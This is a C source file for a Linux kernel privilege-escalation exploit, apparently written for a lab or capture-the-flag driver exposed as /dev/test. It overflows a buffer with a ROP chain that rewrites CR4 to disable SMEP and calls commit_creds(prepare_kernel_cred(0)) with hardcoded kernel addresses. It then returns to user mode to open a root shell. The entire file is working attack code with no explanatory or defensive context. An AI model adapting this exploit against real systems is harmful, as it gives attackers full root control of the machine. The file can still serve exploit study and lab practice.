//gcc -masm=intel -static -o exp exp.c -no-pie
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdint.h>

unsigned long __attribute__((regparm(3))) (*commit_creds)(unsigned long cred);
unsigned long __attribute__((regparm(3))) (*prepare_kernel_cred)(unsigned long cred);

struct register_val {
    uint64_t user_rip;
    uint64_t user_cs;
    uint64_t user_rflags;
    uint64_t user_rsp;
    uint64_t user_ss;
} __attribute__((packed));

struct register_val rv;

void shell() {
    execl("/bin/sh", "sh", NULL);
}

void backup_rv(void) {
    asm("mov rv+8, cs;"
        "pushf; pop rv+16;"
        "mov rv+24, rsp;"
        "mov rv+32, ss;"
       );
    rv.user_rip = &shell;
}

void payload(void) {
    commit_creds(prepare_kernel_cred(0));
    asm("swapgs;"
        "mov %%rsp, %0;"
        "iretq;"
        : : "r" (&rv));
}

int main() {
    int fd;
    size_t rop[10] = {0, };
    
    commit_creds = 0xffffffff8108bed0;
    prepare_kernel_cred = 0xffffffff8108c2f0;

    fd = open("/dev/test", O_RDWR);

    backup_rv();

    memset(rop, 0x41, 40);
    rop[4] = 0xffffffff8197ee5a;     // pop rax; ret;
    rop[5] = 0x1006f0 - (1<<20);     // new cr4 
    rop[6] = 0xffffffff810973c0;     // mov cr4, rax; ret;
    rop[7] = &payload;

    write(fd, rop, sizeof(rop));

    close(fd);

    return 0;
}
